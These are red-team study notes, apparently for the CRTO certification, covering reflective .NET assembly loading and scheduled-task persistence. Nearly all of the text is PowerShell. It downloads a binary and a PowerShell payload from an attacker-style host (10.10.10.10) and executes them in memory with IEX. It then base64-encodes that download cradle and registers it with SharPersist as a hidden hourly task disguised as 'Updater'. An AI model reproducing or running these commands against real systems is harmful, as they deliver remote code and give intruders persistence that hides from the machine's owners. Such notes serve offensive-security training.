---
title: CRTO Notes
date: 2021-08-04 21:00:00 0000
categories: [RED_TEAM, CRTO]
tags: [C# CRTO REDTEAMING]
---

```csharp
[system.reflection.assembly]::LoadFile("file")
 [namespace.class]::Main()
```

Binary reflective loading

```csharp
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/binary.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[binary.Program]::Main("".Split())
```



##Presistance 

###Task Scheduler

Using SharpPresist

```powershell
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/payload.ps1"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
The above snippet will produce a Base64 string which will be supplied in the snippet below:
```powershell
.\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64 ENCODED STRING HERE" -n "Updater" -m add -o hourly
```


    -t --> the desired persistence technique.
    -c --> command to execute.
    -a --> any arguments for that command.
    -n --> the name of the task.
    -m --> to add the task (you can also remove, check and list).
    -o --> the task frequency.

